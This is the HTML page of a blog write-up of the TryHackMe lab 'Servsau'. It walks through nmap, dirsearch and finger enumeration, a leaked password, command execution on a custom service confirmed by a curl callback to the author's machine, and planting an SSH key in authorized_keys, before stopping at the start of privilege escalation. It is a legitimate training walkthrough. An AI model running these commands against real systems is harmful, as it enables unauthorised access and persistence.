<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Servsau | 0x4vian | Abhiyan Chhetri</title>
    <meta name="description" content="Cyber Security Enthusiast | Penetration Tester | Red Teamer">
    <link rel="icon" href="/logo.png">
    
    <link rel="preload" href="/assets/css/0.styles.489d24ff.css" as="style"><link rel="preload" href="/assets/js/app.f24e2c35.js" as="script"><link rel="preload" href="/assets/js/2.2a395b45.js" as="script"><link rel="preload" href="/assets/js/14.947a5956.js" as="script"><link rel="prefetch" href="/assets/js/10.23a08a59.js"><link rel="prefetch" href="/assets/js/11.6921380a.js"><link rel="prefetch" href="/assets/js/12.afc41e3d.js"><link rel="prefetch" href="/assets/js/13.78e0e7e0.js"><link rel="prefetch" href="/assets/js/15.7a1f5b83.js"><link rel="prefetch" href="/assets/js/16.cf9fee51.js"><link rel="prefetch" href="/assets/js/3.06951db2.js"><link rel="prefetch" href="/assets/js/4.9dccd740.js"><link rel="prefetch" href="/assets/js/5.54adec9b.js"><link rel="prefetch" href="/assets/js/6.67793f9c.js"><link rel="prefetch" href="/assets/js/7.59830cd0.js"><link rel="prefetch" href="/assets/js/8.f8fbc6b3.js"><link rel="prefetch" href="/assets/js/9.9f464b50.js">
    <link rel="stylesheet" href="/assets/css/0.styles.489d24ff.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">0x4vian | Abhiyan Chhetri</span></a> <div class="links"><!----> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><a href="/certs/" class="nav-link">Certifications</a></div><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">Blog</a></div><div class="nav-item"><a href="https://www.linkedin.com/in/abhiyan-chhetri-586a44217/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  LinkedIn
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">Home</a></div><div class="nav-item"><a href="/about/" class="nav-link">About</a></div><div class="nav-item"><a href="/certs/" class="nav-link">Certifications</a></div><div class="nav-item"><a href="/blog/" class="nav-link router-link-active">Blog</a></div><div class="nav-item"><a href="https://www.linkedin.com/in/abhiyan-chhetri-586a44217/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  LinkedIn
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>Blog</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/blog/Servsau.html" class="active sidebar-link">Servsau</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/blog/Servsau.html#enumeration" class="sidebar-link">Enumeration</a></li><li class="sidebar-sub-header"><a href="/blog/Servsau.html#getting-shell" class="sidebar-link">Getting Shell</a></li><li class="sidebar-sub-header"><a href="/blog/Servsau.html#horizontal-privilege-escalation" class="sidebar-link">Horizontal Privilege Escalation</a></li><li class="sidebar-sub-header"><a href="/blog/Servsau.html#vertical-privilege-escalation" class="sidebar-link">Vertical Privilege Escalation</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="servsau">Servsau</h1> <p>This is the writeup of the <a href="https://tryhackme.com/room/servsau" target="_blank" rel="noopener noreferrer">Servsau machine in tryhackme<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>. I hardly post any writeups but I have learnt something interesting in this machine so wanted to share with you all. In this write I will also share how I think and approach to solve the box.</p> <p>Hope you will learn something new from this writeup as well.</p> <h2 id="enumeration">Enumeration</h2> <p>Lets start our enumeration with basic nmap scan.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ nmap <span class="token number">10.10</span>.32.20 -vv <span class="token comment"># 10.10.32.20 is the ip of machine</span>

PORT   STATE  SERVICE REASON
<span class="token number">21</span>/tcp closed <span class="token function">ftp</span>     conn-refused
<span class="token number">22</span>/tcp <span class="token function">open</span>   <span class="token function">ssh</span>     syn-ack
<span class="token number">79</span>/tcp <span class="token function">open</span>   finger  syn-ack
<span class="token number">80</span>/tcp <span class="token function">open</span>   http    syn-ack
</code></pre></div><p>On basic scan we got some interesting ports i.e <code>79</code> and <code>80</code>.</p> <p>Let's run the nmap full port scan on background and further enumerate port <code>79</code> and <code>80</code>.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ namp -p- <span class="token number">10.10</span>.32.20 -vv
</code></pre></div><h3 id="port-80">Port 80</h3> <p>Lets start with port 80 as we all are more familiar with this port.
On first visit there is nothing much on website, just a static page with
<strong>&quot;If you want the food, sit at the table.&quot; − Kiran Ghimire</strong> and some Username and passwords (nothing useful)</p> <p>Lets do enumerate directories in web.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ dirsearch -u http://10.10.32.20


  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.1
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>

Extensions: php, aspx, jsp, html, js <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">30</span> <span class="token operator">|</span> Wordlist size: <span class="token number">10877</span>

Output File: /home/parallels/.dirsearch/reports/10.10.32.20/_22-02-07_19-30-10.txt

Error Log: /home/parallels/.dirsearch/logs/errors-22-02-07_19-30-10.log

Target: http://10.10.32.20/

<span class="token punctuation">[</span><span class="token number">19</span>:30:10<span class="token punctuation">]</span> Starting: 
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.ht_wsr.txt                                                                                                             
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccess.bak1
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccess.orig
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccess.save
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccess.sample
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccess_sc
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccess_extra
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccess_orig
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccessBAK
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccessOLD2
<span class="token punctuation">[</span><span class="token number">19</span>:30:14<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htaccessOLD
<span class="token punctuation">[</span><span class="token number">19</span>:30:15<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.html           
<span class="token punctuation">[</span><span class="token number">19</span>:30:15<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htm
<span class="token punctuation">[</span><span class="token number">19</span>:30:15<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htpasswd_test
<span class="token punctuation">[</span><span class="token number">19</span>:30:15<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.htpasswds
<span class="token punctuation">[</span><span class="token number">19</span>:30:15<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /.httr-oauth
<span class="token punctuation">[</span><span class="token number">19</span>:30:48<span class="token punctuation">]</span> <span class="token number">200</span> -    2KB - /index.html                                                                                         
<span class="token punctuation">[</span><span class="token number">19</span>:30:50<span class="token punctuation">]</span> <span class="token number">301</span> -  308B  - /log  -<span class="token operator">&gt;</span>  http://10.10.32.20/log/                                                                      
<span class="token punctuation">[</span><span class="token number">19</span>:30:50<span class="token punctuation">]</span> <span class="token number">200</span> -  931B  - /log/                             
<span class="token punctuation">[</span><span class="token number">19</span>:31:00<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /server-status                                                                            
<span class="token punctuation">[</span><span class="token number">19</span>:31:00<span class="token punctuation">]</span> <span class="token number">403</span> -  276B  - /server-status/
</code></pre></div><p>We found an interesting directory <code>/log/</code>. Upon visiting the <code>/log/</code> directory there is a file name <code>auth.log</code></p> <p>Seeing the content of <code>auth.log</code> . It looks like a auth log file of ubuntu. From this log file we can enumerate the username of the machine.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">cat</span> auth.log<span class="token operator">|</span> <span class="token function">grep</span> password <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$9</span>}'</span> <span class="token operator">|</span> <span class="token function">sort</span> -u
baeker
bekcha
invalid
mantaboy
petrio
</code></pre></div><p>We got the possible username for the machine. There is nothing more left to do in web as there is just a static html page and a log file.</p> <h3 id="port-79">Port 79</h3> <p>Doing some googling on port 79, I found that it can be used to further enumerate the username. If you ever see some strange port just visit Hacktricks and search for that port.
<a href="https://book.hacktricks.xyz/pentesting/pentesting-finger" target="_blank" rel="noopener noreferrer">Finger on Hacktrick<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>Now we have possible list of username from auth.log lets use that in port 79.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> user.txt<span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token string">&quot;<span class="token variable">$i</span>&quot;</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">10.10</span>.32.20 <span class="token number">79</span> <span class="token punctuation">;</span><span class="token keyword">done</span>
Login: baeker                           Name: 
Directory: /home/baeker                 Shell: /bin/sh
Never logged in.
No mail.
No Plan.
Login: bekcha                           Name: 
Directory: /home/bekcha                 Shell: /bin/sh
Never logged in.
No mail.
Plan:
No plan
finger: invalid: no such user.
Login: mantaboy                         Name: 
Directory: /home/mantaboy               Shell: /bin/sh
Never logged in.
No mail.
Project:
Hy, did you <span class="token function">find</span> anything?
Plan:
He was planning to hack Petrio's computer. Petrio is a very sophisticated hacker, he changed his computer username to petriod  and password to h@ack3dP3tri0.

Login: petrio                           Name: 
Directory: /home/petrio                 Shell: /bin/sh
Last login Fri Feb  <span class="token number">4</span> <span class="token number">16</span>:13 <span class="token punctuation">(</span>UTC<span class="token punctuation">)</span> on tty4
No mail.
Plan:
We have to <span class="token function">make</span> it soon.

</code></pre></div><p>There is some interesting notes on user mantaboy.
We found the possible username and password for the machine.
<code>petriod:h@ack3dP3tri0</code> or <code>petrio:h@ack3dP3tri0</code></p> <p>I tried to login to the ssh using the credential but it failed and looks like we can only login to machine using sshkey only.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">ssh</span> petrio@10.10.32.20       
The authenticity of <span class="token function">host</span> <span class="token string">'10.10.32.20 (10.10.32.20)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:wh0pQAHWIHWib+NK4iV7n/9RzdXC41Ts/af9E8DilXg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">10.10</span>.32.20' <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span> to the list of known hosts.
petrio@10.10.32.20: Permission denied <span class="token punctuation">(</span>publickey<span class="token punctuation">)</span>.
</code></pre></div><p>As we need public key to login to ssh the password is useless here.</p> <p>Now lets return to out nmap full port scan because eveything seems like a deadend here.</p> <p>On nmap full port scan we got a new open port <code>20011</code>
Lets vist this port now.</p> <h2 id="getting-shell">Getting Shell</h2> <p>After connecting to port <code>20011</code> it is asking for the username and password.
Luckily the username and passwort that we got from finger worked here.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">nc</span> <span class="token number">10.10</span>.32.20 <span class="token number">20011</span> 
__        __   _                            _____       __  __         ____                           
<span class="token punctuation">\</span> <span class="token punctuation">\</span>      / /__<span class="token operator">|</span> <span class="token operator">|</span> ___ ___  _ __ ___   ___  <span class="token operator">|</span>_   _<span class="token operator">|</span>__   <span class="token operator">|</span>  <span class="token punctuation">\</span>/  <span class="token operator">|</span>_   _  / ___<span class="token operator">|</span>  ___ _ ____   _____ _ __ 
 <span class="token punctuation">\</span> <span class="token punctuation">\</span> /<span class="token punctuation">\</span> / / _ <span class="token punctuation">\</span> <span class="token operator">|</span>/ __/ _ <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token string">'_ ` _ \ / _ \   | |/ _ \  | |\/| | | | | \___ \ / _ \ '</span>__<span class="token punctuation">\</span> <span class="token punctuation">\</span> / / _ <span class="token punctuation">\</span> '__<span class="token operator">|</span>
  <span class="token punctuation">\</span> V  V /  __/ <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __/   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>  ___<span class="token punctuation">)</span> <span class="token operator">|</span>  __/ <span class="token operator">|</span>   <span class="token punctuation">\</span> V /  __/ <span class="token operator">|</span>   
   <span class="token punctuation">\</span>_/<span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>   <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/  <span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span> <span class="token operator">|</span>____/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>   
                                                               <span class="token operator">|</span>___/                                  


Username: petrio
Pass: h@ack3dP3tri0
Command: 
</code></pre></div><p>It is asking for command so I am assuming it will run some bash command. I tried <code>id</code> as command but nothing happened it just closed without displaying anything.</p> <p>At this point I was confused either it run bash command or something else.
To confirm it run bash. I opened a http web server in my machine and sent a curl req from command.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ python -m SimpleHTTPServer <span class="token number">80</span>
Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">80</span> <span class="token punctuation">..</span>.

</code></pre></div><div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">nc</span> <span class="token number">10.10</span>.32.20 <span class="token number">20011</span> 
__        __   _                            _____       __  __         ____                           
<span class="token punctuation">\</span> <span class="token punctuation">\</span>      / /__<span class="token operator">|</span> <span class="token operator">|</span> ___ ___  _ __ ___   ___  <span class="token operator">|</span>_   _<span class="token operator">|</span>__   <span class="token operator">|</span>  <span class="token punctuation">\</span>/  <span class="token operator">|</span>_   _  / ___<span class="token operator">|</span>  ___ _ ____   _____ _ __ 
 <span class="token punctuation">\</span> <span class="token punctuation">\</span> /<span class="token punctuation">\</span> / / _ <span class="token punctuation">\</span> <span class="token operator">|</span>/ __/ _ <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token string">'_ ` _ \ / _ \   | |/ _ \  | |\/| | | | | \___ \ / _ \ '</span>__<span class="token punctuation">\</span> <span class="token punctuation">\</span> / / _ <span class="token punctuation">\</span> '__<span class="token operator">|</span>
  <span class="token punctuation">\</span> V  V /  __/ <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __/   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>  ___<span class="token punctuation">)</span> <span class="token operator">|</span>  __/ <span class="token operator">|</span>   <span class="token punctuation">\</span> V /  __/ <span class="token operator">|</span>   
   <span class="token punctuation">\</span>_/<span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>   <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/  <span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span> <span class="token operator">|</span>____/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>   
                                                               <span class="token operator">|</span>___/                                  


Username: petrio
Pass: h@ack3dP3tri0
Command: <span class="token function">curl</span> <span class="token number">10.6</span>.87.171 <span class="token comment"># 10.6.87.171 is my Ip</span>
</code></pre></div><p>As soon as I send the curl request I got hit in my webserver.</p> <div class="language-bash extra-class"><pre class="language-bash"><code><span class="token number">10.10</span>.32.20 - - <span class="token punctuation">[</span>07/Feb/2022 <span class="token number">19</span>:49:52<span class="token punctuation">]</span> <span class="token string">&quot;GET / HTTP/1.1&quot;</span> <span class="token number">200</span> -
</code></pre></div><p>Now that its confirment it runs bash, lets drop our sshkey in machine. For that I generate ssh key in my machine</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ ssh-keygen                                                                                           
                                                                         <span class="token number">1</span> ⨯
Generating public/private rsa key pair.
sEnter <span class="token function">file</span> <span class="token keyword">in</span> <span class="token function">which</span> to save the key <span class="token punctuation">(</span>/home/parallels/.ssh/id_rsa<span class="token punctuation">)</span>: servsau
Enter passphrase <span class="token punctuation">(</span>empty <span class="token keyword">for</span> no passphrase<span class="token punctuation">)</span>: 
Enter same passphrase again: 
Your identification has been saved <span class="token keyword">in</span> servsau
Your public key has been saved <span class="token keyword">in</span> servsau.pub
The key fingerprint is:
SHA256:A2FlA25ppu4XFSAs+qnX+6Vt+m4TDJrOIRwQFnOnV0g parallels@kali-linux-2021-3
The key's randomart image is:
+---<span class="token punctuation">[</span>RSA <span class="token number">3072</span><span class="token punctuation">]</span>----+
<span class="token operator">|</span>.<span class="token operator">=</span>.ooE*<span class="token operator">=</span>+        <span class="token operator">|</span>
<span class="token operator">|</span>o + <span class="token operator">+=</span>.+<span class="token punctuation">..</span>       <span class="token operator">|</span>
<span class="token operator">|</span> o o .B  <span class="token builtin class-name">.</span>       <span class="token operator">|</span>
<span class="token operator">|</span><span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> .<span class="token operator">=</span><span class="token punctuation">..</span>.        <span class="token operator">|</span>
<span class="token operator">|</span> o o.o +S        <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token operator">=</span>.+ <span class="token builtin class-name">.</span> o.       <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token operator">=</span><span class="token punctuation">..</span> <span class="token punctuation">..</span>.       <span class="token operator">|</span>
<span class="token operator">|</span><span class="token builtin class-name">.</span> <span class="token punctuation">..</span>+ .++        <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token builtin class-name">.</span>  o++*+.       <span class="token operator">|</span>
+----<span class="token punctuation">[</span>SHA256<span class="token punctuation">]</span>-----+

</code></pre></div><p>It cretes two file <code>servsau</code> and <code>servsau.pub</code>
Now lets drop out public key in the remote machine.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">nc</span> <span class="token number">10.10</span>.32.20 <span class="token number">20011</span>
__        __   _                            _____       __  __         ____                           
<span class="token punctuation">\</span> <span class="token punctuation">\</span>      / /__<span class="token operator">|</span> <span class="token operator">|</span> ___ ___  _ __ ___   ___  <span class="token operator">|</span>_   _<span class="token operator">|</span>__   <span class="token operator">|</span>  <span class="token punctuation">\</span>/  <span class="token operator">|</span>_   _  / ___<span class="token operator">|</span>  ___ _ ____   _____ _ __ 
 <span class="token punctuation">\</span> <span class="token punctuation">\</span> /<span class="token punctuation">\</span> / / _ <span class="token punctuation">\</span> <span class="token operator">|</span>/ __/ _ <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token string">'_ ` _ \ / _ \   | |/ _ \  | |\/| | | | | \___ \ / _ \ '</span>__<span class="token punctuation">\</span> <span class="token punctuation">\</span> / / _ <span class="token punctuation">\</span> '__<span class="token operator">|</span>
  <span class="token punctuation">\</span> V  V /  __/ <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  __/   <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>  <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>  ___<span class="token punctuation">)</span> <span class="token operator">|</span>  __/ <span class="token operator">|</span>   <span class="token punctuation">\</span> V /  __/ <span class="token operator">|</span>   
   <span class="token punctuation">\</span>_/<span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>   <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___/  <span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>__, <span class="token operator">|</span> <span class="token operator">|</span>____/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>   
                                                               <span class="token operator">|</span>___/                                  


Username: petrio
Pass: h@ack3dP3tri0
Command: <span class="token function">bash</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1zFwkxeeCj3w1p3E4SXhFYL4dwo92fpcuDAPXZQxLNfSRI7waXuuP3sA8OXwzA+jV79JT/8HVVti3rU1zoq147tKmT9OUAywt2Q4dSZt9PNdSkDb+7uRkbV4g1WNUOHNP/plK7zeCPBld/EHRQUKWhnm227sC+zj5cSK3CZVly/CfnOjyifEn+G9xRk5mX0XugqBfhz4lTDtI0m2WBmYycSwcUyab1LLVyOo0baJtAlClmDHR2peb2cpK9uHEDVQ5NJl7cP8HE94YiH5vMayfpjb29ilbmP5yvcGlx6uAMmP8aZqKDPngWuV6P6r75jZRsgabt29AjTqrETchzsC48oXu+1EPQB/1ABQ/nhfVm7MiZvTdLA5V/Prg1NB5k6ST6M1iLoKBGUkaAGMP7wel1ybovXcJ5ZTnuqVs+iPCgHSrH+6dokQk/gLmTlk1s92I3N6b+vXm46rvezFd56/+sG7xZcQSSPfIg7ZRLSAHqWKLWzqROxYj/w3q34lNqEs= parallels@kali-linux-2021-3&quot;</span> <span class="token operator">&gt;</span> /home/petrio/.ssh/authorized_keys

</code></pre></div><p>Now that we have dropped out public key lets login to machine.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">ssh</span> -i sservsau petrio@10.10.32.20    
</code></pre></div><p>Now we got access as petrio on the machine</p> <h2 id="horizontal-privilege-escalation">Horizontal Privilege Escalation</h2> <p>Now that we got access as petrio in machine lets try privilege escalation.
The first thing I like to try as soon as I got shell is <code>sudo -l</code></p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">sudo</span> -l
Matching Defaults entries <span class="token keyword">for</span> petrio on localhost:
    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User petrio may run the following commands on localhost:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /opt/request.sh

</code></pre></div><p>We can run <code>/opt/request.sh</code> with sudo without entering the password.
Lets see what that program do.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">cat</span> /opt/request.sh
cat: /opt/request.sh: Permission denied

</code></pre></div><p>Looks like we cant read the file content. Lets try to run this.</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">sudo</span> /opt/request.sh 
connecting to telnet<span class="token punctuation">..</span><span class="token punctuation">..</span>
trying to login'<span class="token punctuation">..</span><span class="token punctuation">..</span>
passed username
passed password
Connection closed by foreign host.
Executed<span class="token punctuation">..</span>.

</code></pre></div><p>Looks like it is trying to connect to telnet and doing something.
